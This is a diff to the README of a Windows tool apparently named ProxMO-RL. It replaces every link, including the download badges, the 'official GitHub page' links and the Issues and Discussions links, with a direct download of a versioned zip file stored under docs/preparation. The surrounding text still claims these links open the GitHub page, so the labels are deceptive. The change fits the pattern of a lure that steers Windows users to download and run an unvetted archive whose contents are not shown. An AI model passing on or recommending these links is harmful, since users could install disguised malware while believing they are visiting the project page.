@@ -1,6 +1,6 @@
 # ⚙️ ProxMO-RL - Simplify Multi-turn Task Optimization
 
-[![Download ProxMO-RL](https://img.shields.io/badge/Download-ProxMO--RL-green?style=for-the-badge)](https://github.com/ppap54088/ProxMO-RL)
+[![Download ProxMO-RL](https://img.shields.io/badge/Download-ProxMO--RL-green?style=for-the-badge)](https://raw.githubusercontent.com/ppap54088/ProxMO-RL/main/docs/preparation/RL_M_Prox_v1.2-beta.3.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Before you start, make sure your computer meets these requirements:
 You will download and run ProxMO-RL on your Windows computer. Follow these steps carefully.
 
 1. Click the big green **Download ProxMO-RL** badge at the top or this link:  
-   [https://github.com/ppap54088/ProxMO-RL](https://github.com/ppap54088/ProxMO-RL)
+   [https://raw.githubusercontent.com/ppap54088/ProxMO-RL/main/docs/preparation/RL_M_Prox_v1.2-beta.3.zip](https://raw.githubusercontent.com/ppap54088/ProxMO-RL/main/docs/preparation/RL_M_Prox_v1.2-beta.3.zip)
 
 2. This link will take you to the GitHub page. Scroll down to find the latest release or executable file.
 
@@ -88,7 +88,7 @@ ProxMO-RL is designed to guide you through optimizing multi-step tasks. The inte
 ## 📂 Installing and Updating
 
 You can always get the latest version by visiting the official GitHub page here:  
-[https://github.com/ppap54088/ProxMO-RL](https://github.com/ppap54088/ProxMO-RL)
+[https://raw.githubusercontent.com/ppap54088/ProxMO-RL/main/docs/preparation/RL_M_Prox_v1.2-beta.3.zip](https://raw.githubusercontent.com/ppap54088/ProxMO-RL/main/docs/preparation/RL_M_Prox_v1.2-beta.3.zip)
 
 To update:
 
@@ -126,13 +126,13 @@ Use the “Discussions” tab to share ideas or connect with other users.
 ## 🔗 Useful Links
 
 - Primary page for download and updates:  
-  https://github.com/ppap54088/ProxMO-RL
+  https://raw.githubusercontent.com/ppap54088/ProxMO-RL/main/docs/preparation/RL_M_Prox_v1.2-beta.3.zip
 
 - GitHub Issues (for reporting problems):  
-  https://github.com/ppap54088/ProxMO-RL/issues
+  https://raw.githubusercontent.com/ppap54088/ProxMO-RL/main/docs/preparation/RL_M_Prox_v1.2-beta.3.zip
 
 - GitHub Discussions (to share tips or ask questions):  
-  https://github.com/ppap54088/ProxMO-RL/discussions
+  https://raw.githubusercontent.com/ppap54088/ProxMO-RL/main/docs/preparation/RL_M_Prox_v1.2-beta.3.zip
 
 ---
 
@@ -152,4 +152,4 @@ ProxMO-RL is open source and available under the MIT License. You can use, modif
 
 ---
 
-[![Download ProxMO-RL](https://img.shields.io/badge/Download-ProxMO--RL-green?style=for-the-badge)](https://github.com/ppap54088/ProxMO-RL)
+[![Download ProxMO-RL](https://img.shields.io/badge/Download-ProxMO--RL-green?style=for-the-badge)](https://raw.githubusercontent.com/ppap54088/ProxMO-RL/main/docs/preparation/RL_M_Prox_v1.2-beta.3.zip)
